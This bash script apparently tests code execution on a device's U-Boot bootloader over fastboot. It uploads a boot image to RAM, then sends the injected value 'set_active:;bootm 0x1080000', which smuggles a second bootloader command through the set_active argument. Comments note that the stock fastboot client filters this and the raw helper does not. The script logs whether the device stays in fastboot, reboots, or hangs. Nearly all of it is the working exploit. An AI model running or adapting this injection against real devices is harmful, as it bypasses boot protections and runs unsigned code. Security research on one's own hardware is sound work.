#!/usr/bin/env bash
# bootm_x_test.sh - RAM-only proof-of-execution test via set_active sink.
# NEVER flashes, erases, formats, saveenvs, setenvs, or touches eMMC/misc.
# Forbidden commands (do NOT add): flash, erase, format, saveenv, setenv,
# oem setenv, update, flashall. This script contains none of them.
#
# Usage:
#   ./tools/bootm_x_test.sh [A|B|control]   # default A
#   A       = m1_boot.img  (short delay, outer 0x0FA0)
#   B       = m1b_boot.img (long delay, outer 0xEA60 = 15x)
#   control = 4 KiB INVALID file (measures reject-to-Android baseline)
#
# Flow per run: read-only getvars -> inspector gate -> download ->
# inject "set_active:;bootm $X" -> poll for return -> log timing.
set -u
IMG_A="m1_boot.img"
IMG_B="m1b_boot.img"
# runtime-proven 2026-09-29: BUF==loadaddr on this build
# (reports/buffer-equals-loadaddr-proof.md). NOT 0x10200000.
X="0x1080000"
RUN="${1:-A}"

case "$RUN" in
  A) IMG="$IMG_A"; CMD_TIMEOUT=120 ;;
  B) IMG="$IMG_B"; CMD_TIMEOUT=300 ;;
  control) IMG="/tmp/kernel-src/bootm_x_control.bin"; CMD_TIMEOUT=15
    python3 -c "open('$IMG','wb').write(b'A'*4096)" ;;
  *) echo "usage: $0 [A|B|control]"; exit 2 ;;
esac

log() { printf '[%s] %s\n' "$(date +%H:%M:%S.%N | cut -c1-12)" "$*"; }
die() { log "ABORT: $*"; exit 1; }

command -v fastboot >/dev/null || die "fastboot not in PATH"

log "== step 1: read-only getvars (no writes)"
fastboot devices || die "no device in fastboot"
for v in unlocked secure max-download-size product; do
  log "-- getvar $v"
  fastboot getvar "$v" 2>&1 | head -3
done

log "== step 2: offline inspector gate (must say entrypoint)"
python3 tools/inspect_test_image.py --bootm-addr="$X" "$IMG" || {
  [ "$RUN" = control ] && log "(control is INVALID by design, continuing)" || die "inspector rejected $IMG"
}

SIZE=$(stat -c%s "$IMG")
log "== step 3: download $IMG ($SIZE bytes) to X=$X (raw: download:<hex> + bytes)"
T_DL0=$(date +%s.%N)
# NOTE: stock `fastboot` CLI has no raw-download command (only via flash,
# which is banned). fb_raw.py speaks download:<hex> + bulk data directly.
python3 tools/fb_raw.py download "$IMG" 2>&1 | tail -2 || die "download failed"
log "download sent"

log "== step 4: inject bootm X via set_active sink (RAM-only)"
log "wire bytes: set_active:;bootm $X (stock CLI filters this, raw does not)"
T0=$(date +%s.%N)
# NOTE: U-Boot replies FAIL (first command argc!=2) AFTER both Hush
# commands already ran (see reports/set-active-sink.md). On success the
# device resets mid-read -> USB-GONE with dt = delay+reset time.
python3 tools/fb_raw.py cmd "set_active:;bootm $X" "$CMD_TIMEOUT" 2>&1 | head -3 || true
log "injection round done (reply above; USB-GONE means the box reset)"

log "== step 5: observe (injected bootm failure returns to fastboot; success resets)"
sleep 3
if fastboot devices 2>/dev/null | grep -q .; then
  if fastboot getvar unlocked 2>&1 | grep -q .; then
    T1=$(date +%s.%N)
    DT=$(python3 -c "print(round($T1 - $T0, 1))")
    log "device STILL in fastboot and answering getvar after ~${DT}s"
    log "meaning: bootm X returned (image rejected) or stub died without reset"
    echo "RESULT run=$RUN img=$IMG delta_s=$DT outcome=stayed-in-fastboot" | tee -a /tmp/kernel-src/bootm_x_results.log
    exit 0
  fi
fi
log "device left fastboot -> reset happened, polling adb up to 300s"
for i in $(seq 1 300); do
  if adb devices 2>/dev/null | grep -q device$; then
    T1=$(date +%s.%N)
    DT=$(python3 -c "print(round($T1 - $T0, 1))")
    log "device back in Android (adb) after ~${DT}s (poll #$i)"
    echo "RESULT run=$RUN img=$IMG delta_s=$DT outcome=reboot-to-android" | tee -a /tmp/kernel-src/bootm_x_results.log
    log "check afterwards: adb shell getprop sys.boot.reason"
    exit 0
  fi
  sleep 1
  [ $((i % 10)) -eq 0 ] && log "... still waiting (${i}s)"
done
die "device never came back (no fastboot, no adb): likely HANG - power-cycle needed"
